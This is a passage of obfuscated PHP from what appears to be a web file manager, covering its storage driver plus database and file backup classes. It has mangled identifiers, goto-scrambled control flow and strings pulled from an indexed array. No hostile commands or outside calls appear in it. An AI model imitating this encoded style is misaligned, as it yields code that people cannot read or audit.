$d¤ÑÂ‚ˆ„±[$B¾Á´×„¡©[164]][$B¾Á´×„¡©[170]]; } public function exist($cËÇİ‘„ŠŠ) { $Bã¶¥ÅõÉ£ =& $_SERVER[Ç³Íß¦Ó]; $D³ÙÇ¸‰˜ = $this->parse($cËÇİ‘„ŠŠ); if (!$D³ÙÇ¸‰˜[$Bã¶¥ÅõÉ£[76]]) { return $this->isFile($cËÇİ‘„ŠŠ) || $this->isFolder($cËÇİ‘„ŠŠ); } $eÍÉ›©Çí = array($Bã¶¥ÅõÉ£[393] => $D³ÙÇ¸‰˜[$Bã¶¥ÅõÉ£[392]], $Bã¶¥ÅõÉ£[28] => $D³ÙÇ¸‰˜[$Bã¶¥ÅõÉ£[76]]); $eÙíƒ›æ = $this->model->where($eÍÉ›©Çí)->find(); return $eÙíƒ›æ ? !0 : !1; } public function isFile($FßËÄÏÑ‡¤) { $F–µ‘ö•¨” =& $_SERVER[Ç³Íß¦Ó]; $bª‡ªëâÊ = $this->infoSimple($FßËÄÏÑ‡¤); return $bª‡ªëâÊ && $bª‡ªëâÊ[$F–µ‘ö•¨”[401]] == $F–µ‘ö•¨”[87] ? !1 : !0; } public function isFolder($B‹“ìÉºœŸ) { $dƒôÑÉè› =& $_SERVER[Ç³Íß¦Ó]; $cíæé›ŸöÁ = $this->infoSimple($B‹“ìÉºœŸ); return $cíæé›ŸöÁ && $cíæé›ŸöÁ[$dƒôÑÉè›[401]] == $dƒôÑÉè›[87] ? !0 : !1; } public function listPath($f…÷Î±‡¡÷, $AÒ‚êçåÎõ = false) { $Bˆë—£¬¹æ =& $_SERVER[Ç³Íß¦Ó]; if ($f…÷Î±‡¡÷ == $Bˆë—£¬¹æ[33]) { return !1; } $AÇóİ©ã¦ˆ = array($Bˆë—£¬¹æ[393] => $f…÷Î±‡¡÷); if ($AÒ‚êçåÎõ) { return $this->model->listSource($AÇóİ©ã¦ˆ, -1); } return $this->model->listSource($AÇóİ©ã¦ˆ); } public function has($d†˜Å’¦ˆ¸, $cÜŞ¥†¾  = false, $B«¥¬¬Ÿùœ = null) { $Dƒ‘íìªÔ =& $_SERVER[Ç³Íß¦Ó]; $B˜´Ïù†“… = $this->infoWithChildren($d†˜Å’¦ˆ¸); if ($cÜŞ¥†¾ ) { return array($Dƒ‘íìªÔ[203] => $B˜´Ïù†“…[$Dƒ‘íìªÔ[203]], $Dƒ‘íìªÔ[202] => $B˜´Ïù†“…[$Dƒ‘íìªÔ[202]]); } return $B«¥¬¬Ÿùœ ? $B˜´Ïù†“…[$Dƒ‘íìªÔ[203]] : $B˜´Ïù†“…[$Dƒ‘íìªÔ[202]]; } public function listAll($d£Ëåóî˜£) { $D˜Ô˜ÓæÙ = IO::info($this->pathParse[$_SERVER[Ç³Íß¦Ó][76]]); if (!$D˜Ô˜ÓæÙ) { return array(); } return $this->model->listAll($d£Ëåóî˜£); } public function getContent($E¦¨İ¨«Èƒ) { return $this->model->getContent($E¦¨İ¨«Èƒ); } public function setContent($fÄŠà±×Ù‡, $C¦Š†Áìô„ = '') { return $this->model->setContent($fÄŠà±×Ù‡, $C¦Š†Áìô„); } public function fileSubstr($AÌÔ¶Ë„ÔÓ, $Fö’Í•–¦÷, $d¨ö‹ôÀÒ¢) { return $this->model->fileSubstr($AÌÔ¶Ë„ÔÓ, $Fö’Í•–¦÷, $d¨ö‹ôÀÒ¢); } public function download($f¦‹Š¡¿ˆ’, $b¾Ç—‹»Œ” = '') { $A±¡ÒˆÚó = get_path_father($b¾Ç—‹»Œ”); $eÂÏºÛØƒ… = get_path_this($b¾Ç—‹»Œ”); $Eò»ˆº—Ğ“ = $this->model->fileInfoGet($f¦‹Š¡¿ˆ’); $Fóİ’ì£Ü¢ = IO::copy($Eò»ˆº—Ğ“[$_SERVER[Ç³Íß¦Ó][76]], $A±¡ÒˆÚó, !1, $eÂÏºÛØƒ…); return $Fóİ’ì£Ü¢; } public function setModifyTime($E‚ ‰¾‡„¢, $F‰ï†í‚å‡ = '') { $eÏä¦¨ë÷ =& $_SERVER[Ç³Íß¦Ó]; if (!$E‚ ‰¾‡„¢) { return; } $this->model->where(array($eÏä¦¨ë÷[408] => $E‚ ‰¾‡„¢))->save(array($eÏä¦¨ë÷[84] => $F‰ï†í‚å‡)); } public function upload($f¦ˆƒÄğ», $FĞÛÎ˜ôß, $BÒ©¿¹Ë‰¡ = false, $D¢ª¾ê˜°î = REPEAT_REPLACE) { $EõË‹Í³ƒœ =& $_SERVER[Ç³Íß¦Ó]; $BªŞ–¿ò—» = $this->parse($f¦ˆƒÄğ»); $cêáÑ‚ÚÍ = $this->model->addFile($BªŞ–¿ò—»[$EõË‹Í³ƒœ[392]], $FĞÛÎ˜ôß, $BªŞ–¿ò—»[$EõË‹Í³ƒœ[76]], $BÒ©¿¹Ë‰¡, $D¢ª¾ê˜°î); return $this->getPathOuter($cêáÑ‚ÚÍ); } public function uploadFileByID($FÜ´óôƒ, $D…–œä‡ãö, $dÇ…¸ÉÏ¯„) { $cæ‰¾šçš˜ =& $_SERVER[Ç³Íß¦Ó]; $AëÌ÷»‚×‰ = $this->parse($FÜ´óôƒ); $FÃ•è£›ßÕ = $this->model->addFileByFileID($AëÌ÷»‚×‰[$cæ‰¾šçš˜[392]], $D…–œä‡ãö, $AëÌ÷»‚×‰[$cæ‰¾šçš˜[76]], $dÇ…¸ÉÏ¯„); return $this->getPathOuter($FÃ•è£›ßÕ); } public function addFileByRemote($cÂé³…ğèØ, $BÊÌÔ†Ğ¤Ù, $DŞ³¬Š³¸Ù = array(), $BÙµ¶®“à÷ = '', $D„ï°ˆ“íÅ) { $bÌ–ÀÓ¤´Ó =& $_SERVER[Ç³Íß¦Ó]; $DİÆë£Æ½ï = $this->parse($cÂé³…ğèØ); $BÙµ¶®“à÷ = empty($BÙµ¶®“à÷) ? $DİÆë£Æ½ï[$bÌ–ÀÓ¤´Ó[76]] : $BÙµ¶®“à÷; $F×ŒóØ£Óñ = $this->model->addFileByRemote($DİÆë£Æ½ï[$bÌ–ÀÓ¤´Ó[392]], $BÊÌÔ†Ğ¤Ù, $BÙµ¶®“à÷, $DŞ³¬Š³¸Ù, $D„ï°ˆ“íÅ); return $this->getPathOuter($F×ŒóØ£Óñ); } public function uploadLink($aà‚Š“¬Åè, $EÇ‚ßóˆµ¦ = 0) { $f„—÷—Ù´ò =& $_SERVER[Ç³Íß¦Ó]; $c‚•’ŞÈ³Æ = $this->parse($aà‚Š“¬Åè); $dëĞôîĞ»‡ = _get($GLOBALS[$f„—÷—Ù´ò[7]], $f„—÷—Ù´ò[1206]); $FÏäÛ»»ŒÂ = _get($GLOBALS[$f„—÷—Ù´ò[7]], $f„—÷—Ù´ò[1207]); $aà‚Š“¬Åè = Model($f„—÷—Ù´ò[570])->createFileName($c‚•’ŞÈ³Æ[$f„—÷—Ù´ò[76]], $dëĞôîĞ»‡, $FÏäÛ»»ŒÂ); return IO::uploadLink($aà‚Š“¬Åè, $EÇ‚ßóˆµ¦); } public function fileNameAuto($a¥²À°âù, $Dö…Œ£êÃ, $fÍ™ìî»Íæ = REPEAT_REPLACE, $a­’‚ó¹ó = false) { return $this->model->fileNameAuto($a¥²À°âù, $Dö…Œ£êÃ, $fÍ™ìî»Íæ, $a­’‚ó¹ó); } public function fileNameExist($Dİ‚³º‹¶, $bÎ¤—Åò¼) { return $this->model->fileNameExist($Dİ‚³º‹¶, $bÎ¤—Åò¼); } protected function _fileOut($C‹ÑÌ™—‰Ø, $b„ˆ¤È ‰Û = false, $d¼©•ø‰‹– = false, $EÁÜóĞ¥›Ã = '', $C£½È¹‹ô‰ = false) { goto e‚¨—×¸’; båºŸ¢Ïİ¤: $dŸÜµ¸‚ = $this->model->fileInfoGet($C‹ÑÌ™—‰Ø); $EÁÜóĞ¥›Ã = $dŸÜµ¸‚[$Cñ¿ÉËùµë[170]] ? $dŸÜµ¸‚[$Cñ¿ÉËùµë[170]] : $EÁÜóĞ¥›Ã; $eÑŠ¢‰¢ = isset($GLOBALS[$Cñ¿ÉËùµë[1209]]) ? $GLOBALS[$Cñ¿ÉËùµë[1209]] : $CœÕ»¡ïø[$Cñ¿ÉËùµë[28]]; goto Eİš­ÌÄ; Eİš­ÌÄ: if ($C£½È¹‹ô‰) { return IO::fileOutServer($dŸÜµ¸‚[$Cñ¿ÉËùµë[76]], $b„ˆ¤È ‰Û, $eÑŠ¢‰¢, $EÁÜóĞ¥›Ã); } IO::fileOut($dŸÜµ¸‚[$Cñ¿ÉËùµë[76]], $b„ˆ¤È ‰Û, $eÑŠ¢‰¢, $EÁÜóĞ¥›Ã); goto A´ÏŸ±ìóÙ; e‚¨—×¸’: $Cñ¿ÉËùµë =& $_SERVER[Ç³Íß¦Ó]; $CœÕ»¡ïø = $this->model->sourceInfo($C‹ÑÌ™—‰Ø); if ($CœÕ»¡ïø[$Cñ¿ÉËùµë[401]] == $Cñ¿ÉËùµë[87]) { header($Cñ¿ÉËùµë[1208]); die; } goto båºŸ¢Ïİ¤; A´ÏŸ±ìóÙ: } public function fileOut($aŒºÉÈ‚Ô, $D¥º·Î¹« = false, $EÄ†¬ÜÆó = false, $eçñäÒ’è¼ = '') { $this->_fileOut($aŒºÉÈ‚Ô, $D¥º·Î¹«, $EÄ†¬ÜÆó, $eçñäÒ’è¼); } public function fileOutServer($DáŞ§Êœù, $B«æÔ‡ª = false, $C†›î¬Ö¾å = false, $b‹‰¢‚Î’Ÿ = '') { $this->_fileOut($DáŞ§Êœù, $B«æÔ‡ª, $C†›î¬Ö¾å, $b‹‰¢‚Î’Ÿ, !0); } protected function _fileOutImage($CöêÆî«Ñ, $bÎ­ãÅŸÖ = 250) { goto b¹‚ÜëâÂÊ; b¹‚ÜëâÂÊ: $bñ¾¸è¶š• =& $_SERVER[Ç³Íß¦Ó]; $F‹èŠá©á = $this->model->pathInfo($CöêÆî«Ñ); if ($F‹èŠá©á[$bñ¾¸è¶š•[401]] == $bñ¾¸è¶š•[87]) { show_json($bñ¾¸è¶š•[1210] . $CöêÆî«Ñ, !1); } goto cõæ–ÉÌŞ¨; cõæ–ÉÌŞ¨: $aÅÁšãâ¶„ = $this->model->fileInfoGet($CöêÆî«Ñ); $aÅÁšãâ¶„[$bñ¾¸è¶š•[28]] = $F‹èŠá©á[$bñ¾¸è¶š•[28]]; $aÅÁšãâ¶„[$bñ¾¸è¶š•[163]] = $F‹èŠá©á[$bñ¾¸è¶š•[163]]; goto F‘Ç¢‰ÙÓ÷; F‘Ç¢‰ÙÓ÷: $GLOBALS[$bñ¾¸è¶š•[1209]] = $aÅÁšãâ¶„[$bñ¾¸è¶š•[28]]; $GLOBALS[$bñ¾¸è¶š•[162]] = $aÅÁšãâ¶„; IO::fileOutImage($aÅÁšãâ¶„[$bñ¾¸è¶š•[76]], $bÎ­ãÅŸÖ); goto dµÏÚ‰·ê; dµÏÚ‰·ê: } public function fileOutImage($a¶Ø­ÏÍá·, $aÅ¼¨ÛÎ…‹ = 250) { $this->_fileOutImage($a¶Ø­ÏÍá·, $aÅ¼¨ÛÎ…‹); } public function fileOutImageServer($aŞ”°‡˜òá, $c‹¸Å›ÓÜ = 250) { $this->_fileOutImage($aŞ”°‡˜òá, $c‹¸Å›ÓÜ); } public function link($Dƒå™ÔĞ—, $aªµË…Ü = '') { $f°ÙÕÖ„‰ = $this->model->fileInfoGet($Dƒå™ÔĞ—); return IO::link($f°ÙÕÖ„‰[$_SERVER[Ç³Íß¦Ó][76]], $aªµË…Ü); } protected function parse($b¾ªğô§ç) { $aˆ¶İ†òÕ =& $_SERVER[Ç³Íß¦Ó]; if (strstr($b¾ªğô§ç, $aˆ¶İ†òÕ[8]) === !1) { return array($aˆ¶İ†òÕ[410] => intval($b¾ªğô§ç), $aˆ¶İ†òÕ[76] => $aˆ¶İ†òÕ[33], $aˆ¶İ†òÕ[1205] => array()); } $d¤¸‚¹ò±ë = explode($aˆ¶İ†òÕ[8], trim($b¾ªğô§ç, $aˆ¶İ†òÕ[8])); if (count($d¤¸‚¹ò±ë) < 2) { show_tips($b¾ªğô§ç . $aˆ¶İ†òÕ[1211]); } return array($aˆ¶İ†òÕ[410] => intval($d¤¸‚¹ò±ë[0]), $aˆ¶İ†òÕ[76] => $d¤¸‚¹ò±ë[1], $aˆ¶İ†òÕ[1205] => array_slice($d¤¸‚¹ò±ë, 1)); } } goto E‚ÑçİïŒ¯; E±•İ©æÖ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a•˜Áš•š; fˆêÆ±…: $d‡ïÃÛÑğœ = $this->tmpFilesPath() . $A§ê„á¤Ÿ[739] . self::$name . $A§ê„á¤Ÿ[8]; del_dir($d‡ïÃÛÑğœ); mk_dir($d‡ïÃÛÑğœ); goto E¾™×ºßº; e‰ì¦æÔ„„: $Bà‚Şéµ’ = new DbManage($Dè™”õ—å¸, $CÈ…ŒÊñáÇ); $BíÏ¼š„Ğ = array($A§ê„á¤Ÿ[737] => $CÈ…ŒÊñáÇ, $A§ê„á¤Ÿ[738] => time()); Backup::set($BíÏ¼š„Ğ); goto fˆêÆ±…; a•˜Áš•š: $A§ê„á¤Ÿ =& $_SERVER[Ç³Íß¦Ó]; $có±…Ì²»é = Backup::get(); self::$io = $có±…Ì²»é[$A§ê„á¤Ÿ[716]]; goto EáÔàÎ°¦å; EáÔàÎ°¦å: self::$name = $có±…Ì²»é[$A§ê„á¤Ÿ[28]]; $Dè™”õ—å¸ = $GLOBALS[$A§ê„á¤Ÿ[6]][$A§ê„á¤Ÿ[17]]; $CÈ…ŒÊñáÇ = $this->_dbType($Dè™”õ—å¸); goto e‰ì¦æÔ„„; CĞ÷©å“Ëœ: if (isset($dßáÊí Ø->task[$A§ê„á¤Ÿ[749]])) { $cƒò½µØÇ = $dßáÊí Ø->task[$A§ê„á¤Ÿ[749]] ? $dßáÊí Ø->task[$A§ê„á¤Ÿ[749]] : timeFloat(); $b˜¦ÌÓö±Ü = $cƒò½µØÇ - $dßáÊí Ø->task[$A§ê„á¤Ÿ[750]]; if ($b˜¦ÌÓö±Ü >= 0.2) { $E†ëñ°ô„  += 1; } } $dßáÊí Ø->end(); $BíÏ¼š„Ğ = array($A§ê„á¤Ÿ[737] => $CÈ…ŒÊñáÇ, $A§ê„á¤Ÿ[734] => 1, $A§ê„á¤Ÿ[751] => $E†ëñ°ô„ , $A§ê„á¤Ÿ[752] => $D÷Ê·õß†À, $A§ê„á¤Ÿ[753] => time()); goto F»İƒï¼Øœ; E¾™×ºßº: $E†ëñ°ô„  = $D÷Ê·õß†À = 0; try { $FŠàÉÅÀ»ò = $Bà‚Şéµ’->db()->getTables(); } catch (Exception $C°áìí¶óÊ) { return !1; } $FŠàÉÅÀ»ò = array_diff($FŠàÉÅÀ»ò, array($A§ê„á¤Ÿ[740], $A§ê„á¤Ÿ[741])); goto f¬Ó¸ó‡‡•; F»İƒï¼Øœ: Backup::set($BíÏ¼š„Ğ); if ($E†ëñ°ô„  > $D÷Ê·õß†À) { write_log(array($A§ê„á¤Ÿ[754], $BíÏ¼š„Ğ), $A§ê„á¤Ÿ[743]); return !1; } return !0; goto eùÃ“ß´à‹; f¬Ó¸ó‡‡•: foreach ($FŠàÉÅÀ»ò as $fÏ£‡ºÌ) { $E†ëñ°ô„  += $Bà‚Şéµ’->model($fÏ£‡ºÌ)->count(); } $dßáÊí Ø = new Task($A§ê„á¤Ÿ[742], $A§ê„á¤Ÿ[743], $E†ëñ°ô„ , LNG($A§ê„á¤Ÿ[744]) . $A§ê„á¤Ÿ[745] . LNG($A§ê„á¤Ÿ[746])); foreach ($FŠàÉÅÀ»ò as $fÏ£‡ºÌ) { $A˜°Ùòªš = $d‡ïÃÛÑğœ . $fÏ£‡ºÌ . $A§ê„á¤Ÿ[747]; $EŞ¸­ˆ¡©Ä = null; if ($fÏ£‡ºÌ == $A§ê„á¤Ÿ[748] && (!isset($có±…Ì²»é[$A§ê„á¤Ÿ[717]]) || $có±…Ì²»é[$A§ê„á¤Ÿ[717]] == $A§ê„á¤Ÿ[495])) { $EŞ¸­ˆ¡©Ä = self::$io; } $D÷Ê·õß†À += $Bà‚Şéµ’->sqlFromDb($fÏ£‡ºÌ, $A˜°Ùòªš, $dßáÊí Ø, $EŞ¸­ˆ¡©Ä); } goto CĞ÷©å“Ëœ; eùÃ“ß´à‹: } private function _dbType($a¼šÃƒĞÀ¶) { goto eÎÙ¯Å¦õÔ; eÎÙ¯Å¦õÔ: $fª¤Ô´çôÊ =& $_SERVER[Ç³Íß¦Ó]; $a¼šÃƒĞÀ¶ = array_change_key_case($a¼šÃƒĞÀ¶); $E÷í¨…í–ù = $a¼šÃƒĞÀ¶[$fª¤Ô´çôÊ[755]]; goto Dµ’ØßÙÀ; Aßˆ›Û™Èº: return $E÷í¨…í–ù; goto B´—¥á¿×´; Dµ’ØßÙÀ: if ($E÷í¨…í–ù == $fª¤Ô´çôÊ[756]) { $f ®ŸùÍ¶ = explode($fª¤Ô´çôÊ[4], $a¼šÃƒĞÀ¶[$fª¤Ô´çôÊ[757]]); $E÷í¨…í–ù = $f ®ŸùÍ¶[0]; } $cÏñô–Óœâ = array($fª¤Ô´çôÊ[758] => $fª¤Ô´çôÊ[9], $fª¤Ô´çôÊ[759] => $fª¤Ô´çôÊ[760]); if (isset($cÏñô–Óœâ[$E÷í¨…í–ù])) { $E÷í¨…í–ù = $cÏñô–Óœâ[$E÷í¨…í–ù]; } goto Aßˆ›Û™Èº; B´—¥á¿×´: } private function tmpFilesPath() { $aºêé¢À‘— =& $_SERVER[Ç³Íß¦Ó]; $DóÄ¤ô = TEMP_FILES; if ($GLOBALS[$aºêé¢À‘—[6]][$aºêé¢À‘—[88]][$aºêé¢À‘—[761]]) { $DóÄ¤ô = $GLOBALS[$aºêé¢À‘—[6]][$aºêé¢À‘—[88]][$aºêé¢À‘—[761]]; if (!mk_dir($DóÄ¤ô) || !is_writable($DóÄ¤ô) || !IO::mkfile($DóÄ¤ô . $aºêé¢À‘—[762])) { $DóÄ¤ô = TEMP_FILES; } } return $DóÄ¤ô; } } class BackupDbFile { public function __construct() { } public function index() { goto F‘·ÓÓâó; FÚ‰âéñÛ: if (!$BÄ§ˆ­ÂÌø) { return !1; } $aÙì§ÃÍ = array($Bšã½½‘Ä[763] => $BÄ§ˆ­ÂÌø, $Bšã½½‘Ä[764] => time()); Backup::set($aÙì§ÃÍ); goto b×Éä—­¿; EÇÏ¬ìôÁˆ: Backup::set($aÙì§ÃÍ); return !0; goto dÆ‡¯èñªÅ; f‘Š¹²™–Ö: $F·ŸÕÉá¬ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$f—æ‰ªÓ }\57"; $fíÊœ½‹÷ = $this->backupPath($A™éŞ´ší); if (!($fíÊœ½‹÷ = IO::mkdir($fíÊœ½‹÷))) { return !1; } goto a”Œá±²ó; CŸ’ÉÍ·Ê‡: $FÖ‡ôˆÉÄ = CONTROLLER_DIR . $Bšã½½‘Ä[769]; $eø‹îĞŠ’Ü = CONTROLLER_DIR . $Bšã½½‘Ä[770]; IO::copy($FÖ‡ôˆÉÄ, $fíÊœ½‹÷); goto eÉà¡óÛ¤Ù; b×Éä—­¿: $E„ôš„æéÅ = new TaskFileTransfer($Bšã½½‘Ä[765], $Bšã½½‘Ä[743], count($DÀáãİ†ØÉ), LNG($Bšã½½‘Ä[744]) . $Bšã½½‘Ä[438] . LNG($Bšã½½‘Ä[746]) . $Bšã½½‘Ä[766]); $E„ôš„æéÅ->task[$Bšã½½‘Ä[724]] = $BÄ§ˆ­ÂÌø; foreach ($C¡¼ÌõæÀ[$Bšã½½‘Ä[74]] as $eÚïŞ¯œ©) { $A’í«İé»Ø = IO::move($eÚïŞ¯œ©[$Bšã½½‘Ä[76]], $fíÊœ½‹÷); if (!$A’í«İé»Ø) { $E„ôš„æéÅ->end(); $d“œÈ¬õ©Ó = IO::getLastError($Bšã½½‘Ä[767] . $eÚïŞ¯œ©[$Bšã½½‘Ä[76]] . $Bšã½½‘Ä[768] . $fíÊœ½‹÷ . $Bšã½½‘Ä[503]); write_log($d“œÈ¬õ©Ó, $Bšã½½‘Ä[743]); return !1; } } goto CŸ’ÉÍ·Ê‡; eÉà¡óÛ¤Ù: IO::copy($eø‹îĞŠ’Ü, $fíÊœ½‹÷); $E„ôš„æéÅ->end(); $aÙì§ÃÍ = array($Bšã½½‘Ä[771] => $BÄ§ˆ­ÂÌø, $Bšã½½‘Ä[772] => time()); goto EÇÏ¬ìôÁˆ; a”Œá±²ó: $C¡¼ÌõæÀ = IO::listPath($F·ŸÕÉá¬); $DÀáãİ†ØÉ = isset($C¡¼ÌõæÀ[$Bšã½½‘Ä[74]]) ? $C¡¼ÌõæÀ[$Bšã½½‘Ä[74]] : array(); $BÄ§ˆ­ÂÌø = array_sum(array_column($DÀáãİ†ØÉ, $Bšã½½‘Ä[78])); goto FÚ‰âéñÛ; F‘·ÓÓâó: $Bšã½½‘Ä =& $_SERVER[Ç³Íß¦Ó]; $A™éŞ´ší = Backup::get(); $f—æ‰ªÓ  = $A™éŞ´ší[$Bšã½½‘Ä[28]]; goto f‘Š¹²™–Ö; dÆ‡¯èñªÅ: } private function backupPath($F©Á×¡×‹) { $A²á¾š†Ù =& $_SERVER[Ç³Íß¦Ó]; $dÄÌçÊíÚŒ = $F©Á×¡×‹[$A²á¾š†Ù[28]]; $d¬·šŸè·Ÿ = Model($A²á¾š†Ù[731])->get($A²á¾š†Ù[732]); $aìîÇÏ«Ç× = substr(md5($A²á¾š†Ù[733] . $d¬·šŸè·Ÿ . $dÄÌçÊíÚŒ), 0, 8); return "\x7b\x69\x6f\x3a{$F©Á×¡×‹[$A²á¾š†Ù[716]]}\175\57\144\x61\x74\x61\142\141\x73\145\57\142\x61\x63\x6b\x75\x70\57" . $dÄÌçÊíÚŒ . $A²á¾š†Ù[71] . $aìîÇÏ«Ç×; } private function tmpFilesPath() { $a¨º†â†é =& $_SERVER[Ç³Íß¦Ó]; $B†ò‹äÕğË = TEMP_FILES; if ($GLOBALS[$a¨º†â†é[6]][$a¨º†â†é[88]][$a¨º†â†é[761]]) { $B†ò‹äÕğË = $GLOBALS[$a¨º†â†é[6]][$a¨º†â†é[88]][$a¨º†â†é[761]]; if (!mk_dir($B†ò‹äÕğË) || !is_writable($B†ò‹äÕğË) || !IO::mkfile($B†ò‹äÕğË . $a¨º†â†é[762])) { $B†ò‹äÕğË = TEMP_FILES; } } return $B†ò‹äÕğË; } } class BackupFile { public function __construct() { } public function index() { goto EĞ‚†ööì; EĞ‚†ööì: $e£‘¨æîÌ = Backup::get(); $F•¹‡¦Ïë = $e£‘¨æîÌ[$_SERVER[Ç³Íß¦Ó][290]][$_SERVER[Ç³Íß¦Ó][192]][$_SERVER[Ç³Íß¦Ó][445]]; $C†Ç¾ëÆªÉ = array($_SERVER[Ç³Íß¦Ó][446] => array($_SERVER[Ç³Íß¦Ó][773], $F•¹‡¦Ïë), $_SERVER[Ç³Íß¦Ó][774] => array($_SERVER[Ç³Íß¦Ó][328], $e£‘¨æîÌ[$_SERVER[Ç³Íß¦Ó][716]])); goto Dèè´¨‚®­; bˆŠ“®Ş¸É: $D…½ƒ Æè‰->task[$_SERVER[Ç³Íß¦Ó][724]] = $e¹Œ‡¥ÕÃâ; $F®Şöºì¦« = array($_SERVER[Ç³Íß¦Ó][777] => $aÍµñ¶Éî§, $_SERVER[Ç³Íß¦Ó][778] => $e¹Œ‡¥ÕÃâ, $_SERVER[Ç³Íß¦Ó][779] => time()); Backup::set($F®Şöºì¦«); goto AßµÒ½ˆŠÒ; A˜…êˆ„‘: $F®Şöºì¦« = array($_SERVER[Ç³Íß¦Ó][789] => 1, $_SERVER[Ç³Íß¦Ó][474] => time(), $_SERVER[Ç³Íß¦Ó][736] => 1, $_SERVER[Ç³Íß¦Ó][786] => $F•¹‡¦Ïë, $_SERVER[Ç³Íß¦Ó][778] => $e¹Œ‡¥ÕÃâ, $_SERVER[Ç³Íß¦Ó][777] => $aÍµñ¶Éî§, $_SERVER[Ç³Íß¦Ó][790] => time()); if ($C·¡¾„·õ) { $F®Şöºì¦«[$_SERVER[Ç³Íß¦Ó][787]] = $bñ¥ÑËŸ¬ß; $F®Şöºì¦«[$_SERVER[Ç³Íß¦Ó][788]] = $Bì¹‡Ë×²; } Backup::set($F®Şöºì¦«); goto FõŸĞëî’á; fî•ù–¯: $fƒÖºšáóÂ = 1000; $dÂ‡Æ–­Áô = $C·¡¾„·õ = 0; $bÃ•öÆ¿‘– = array(); goto f‡éÃ±ß–Ú; Dèè´¨‚®­: $aÍµñ¶Éî§ = (int) Model($_SERVER[Ç³Íß¦Ó][748])->where($C†Ç¾ëÆªÉ)->count($_SERVER[Ç³Íß¦Ó][445]); $e¹Œ‡¥ÕÃâ = (int) Model($_SERVER[Ç³Íß¦Ó][748])->where($C†Ç¾ëÆªÉ)->sum($_SERVER[Ç³Íß¦Ó][78]); $D…½ƒ Æè‰ = new TaskFileTransfer($_SERVER[Ç³Íß¦Ó][775], $_SERVER[Ç³Íß¦Ó][743], $aÍµñ¶Éî§, LNG($_SERVER[Ç³Íß¦Ó][744]) . $_SERVER[Ç³Íß¦Ó][745] . LNG($_SERVER[Ç³Íß¦Ó][776])); goto bˆŠ“®Ş¸É; AßµÒ½ˆŠÒ: $BĞØ•›™¼‘ = !0; $aÃÅ¡ä = $this->storeIds(); $c¡ÒŠá¾İŠ = 1; goto fî•ù–¯; f‡éÃ±ß–Ú: $Bì¹‡Ë×² = $bñ¥ÑËŸ¬ß = 0; do { $Eö“ÄèˆŠ‹ = $_SERVER[Ç³Íß¦Ó][780]; $fˆôÇÂ…ã = Model($_SERVER[Ç³Íß¦Ó][748])->where($C†Ç¾ëÆªÉ)->field($Eö“ÄèˆŠ‹)->order($_SERVER[Ç³Íß¦Ó][781])->selectPage($fƒÖºšáóÂ, $c¡ÒŠá¾İŠ); $A·´¹âòæ = !empty($fˆôÇÂ…ã[$_SERVER[Ç³Íß¦Ó][366]]) ? $fˆôÇÂ…ã[$_SERVER[Ç³Íß¦Ó][366]] : array(); foreach ($A·´¹âòæ as $EùŸ¼æÉ¨) { goto dë”î„ù’Š; få¯ã±ö‚í: if ($dÂ‡Æ–­Áô >= 1024 * 1024 * 100) { $F®Şöºì¦« = array($_SERVER[Ç³Íß¦Ó][786] => $F•¹‡¦Ïë, $_SERVER[Ç³Íß¦Ó][787] => $bñ¥ÑËŸ¬ß, $_SERVER[Ç³Íß¦Ó][788] => $Bì¹‡Ë×²); Backup::set($F®Şöºì¦«); $dÂ‡Æ–­Áô = $C·¡¾„·õ = 0; } goto d¯Ò÷ÎÛ·; dë”î„ù’Š: if (!$this->_fileExist($EùŸ¼æÉ¨, $bÃ•öÆ¿‘–, $aÃÅ¡ä)) { $aÍµñ¶Éî§ -= 1; $e¹Œ‡¥ÕÃâ -= (int) $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][78]]; write_log("\x66\x69\154\x65\40\x6e\x6f\x74\x20\145\170\x69\x73\x74\56\146\x69\x6c\145\x49\x44\x3a{$EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][445]]}\x2c\x20\x70\x61\x74\150\72{$EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][76]]}", $_SERVER[Ç³Íß¦Ó][782]); continue; } $B¶°“Ê²†Õ = $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][76]]; $Få‡Š’·½Á = "\173\x69\x6f\x3a{$e£‘¨æîÌ[$_SERVER[Ç³Íß¦Ó][716]]}\175" . substr($B¶°“Ê²†Õ, strlen("\x7b\151\157\72{$EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][783]]}\175")); goto EœñÛİ—§; EœñÛİ—§: if (IO::exist($Få‡Š’·½Á)) { $D…½ƒ Æè‰->updateFileEnd($EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][28]], $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][78]]); } else { $Få‡Š’·½Á = get_path_father($Få‡Š’·½Á); IO::mkdir($Få‡Š’·½Á); if (!IO::copy($B¶°“Ê²†Õ, $Få‡Š’·½Á, $_SERVER[Ç³Íß¦Ó][784])) { write_log($_SERVER[Ç³Íß¦Ó][785] . $B¶°“Ê²†Õ . $_SERVER[Ç³Íß¦Ó][768] . $Få‡Š’·½Á . $_SERVER[Ç³Íß¦Ó][503], $_SERVER[Ç³Íß¦Ó][743]); $BĞØ•›™¼‘ = !1; break; } } $F•¹‡¦Ïë = $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][445]]; $C·¡¾„·õ += 1; goto DÇìçù…; DÇìçù…: $dÂ‡Æ–­Áô += $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][78]]; $bñ¥ÑËŸ¬ß += 1; $Bì¹‡Ë×² += $EùŸ¼æÉ¨[$_SERVER[Ç³Íß¦Ó][78]]; goto få¯ã±ö‚í; d¯Ò÷ÎÛ·: } $d‚Ìõ¥©­È = count($A·´¹âòæ); $c¡ÒŠá¾İŠ++; } while ($d‚Ìõ¥©­È == $fƒÖºšáóÂ); $D…½ƒ Æè‰->end(); goto A˜…êˆ„‘; FõŸĞëî’á: $this->_fileFilter($bÃ•öÆ¿‘–); return !0; goto DÅ½’‹Íœ; DÅ½’‹Íœ: } private function _fileExist($CÕÉ¸Æ», &$b¶˜ÇÍ–İ, $DãÒÍ®ƒœÑ) { goto B¬à²°Ì˜‘; EÖ¼Ù›¾œÌ: if (!in_array($CÕÉ¸Æ»[$FŒ‘Ÿ¯¨’¥[783]], $DãÒÍ®ƒœÑ)) { return !1; } if (IO::exist($eø‘Áù†Ò)) { return 